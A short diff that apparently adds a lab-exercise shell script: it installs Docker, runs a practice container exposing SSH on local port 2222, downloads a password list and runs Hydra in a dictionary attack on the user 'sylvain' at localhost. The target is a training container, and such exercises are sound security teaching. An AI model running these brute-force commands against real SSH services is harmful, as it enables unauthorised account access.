@@ -1,0 +1,12 @@
+# Install Docker
+sudo apt-get update
+sudo apt-get install -y docker.io
+
+# Pull and run the Docker image
+sudo docker run -p 2222:22 -d -ti sylvainkalache/264-1
+
+# Download a password dictionary
+wget https://example.com/password_dictionary.txt
+
+# Use Hydra to perform a dictionary attack
+hydra -l sylvain -P password_dictionary.txt ssh://127.0.0.1:2222
